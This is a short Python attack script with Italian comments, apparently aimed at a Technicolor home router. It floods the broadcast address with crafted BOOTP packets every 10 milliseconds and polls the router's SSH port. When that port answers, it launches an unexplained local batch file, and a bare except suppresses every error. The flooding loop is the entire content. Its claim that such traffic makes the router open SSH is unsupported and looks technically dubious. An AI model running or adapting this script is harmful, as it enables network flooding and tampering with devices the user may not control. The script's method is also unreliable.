import socket
import os
import time

def ghost_attack():
    # IP che il Technicolor si aspetta
    target_ip = "192.168.1.1"
    pc_ip = "192.168.1.100"
    
    print("--- CYBER GHOST: MONITORAGGIO ATTIVO ---")
    
    # Socket ultra-veloce
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    
    attempts = 0
    while True:
        try:
            # Bombardamento BOOTP (Attacco principale)
            payload = b"\x02\x01\x06\x00" + b"\x00" * 300
            s.sendto(payload, ('255.255.255.255', 68))
            attempts += 1
            
            # Log silenzioso ogni 100 pacchetti
            if attempts % 100 == 0:
                print(f"Tentativi automatici effettuati: {attempts}")
                
            # Verifica se il router ha aperto la porta SSH (segno di successo)
            sock_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_test.settimeout(0.1)
            result = sock_test.connect_ex((target_ip, 22))
            
            if result == 0:
                print("[!!!] ROUTER AGGANCIATO! Lancio configurazione finale...")
                os.system("config_ripetitore.bat") # Lancia la fase finale da solo
                break
            sock_test.close()
            
        except:
            pass
        time.sleep(0.01) # Velocità massima

if __name__ == "__main__":
    ghost_attack()
